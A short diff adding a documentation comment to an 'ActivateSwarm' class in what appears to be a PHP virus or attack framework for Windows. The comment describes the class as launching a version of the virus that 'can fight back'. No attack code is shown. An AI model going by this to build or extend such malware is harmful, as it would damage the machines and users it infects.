@@ -5,6 +5,14 @@ namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;
 use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScriptWin;
 
+/**
+ * Class ActivateSwarm. Activates another version of the virus that can fight back. Consumes CPU like hell tho
+ *
+ * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
+ * @author Quang Ho <157239q@gmail.com>
+ * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
+ * @license http://www.opensource.org/licenses/mit-license.html  MIT License
+ */
 class ActivateSwarm extends AttackBase {
     private string $baseLocation = "";
     private string $initialLocation = "";
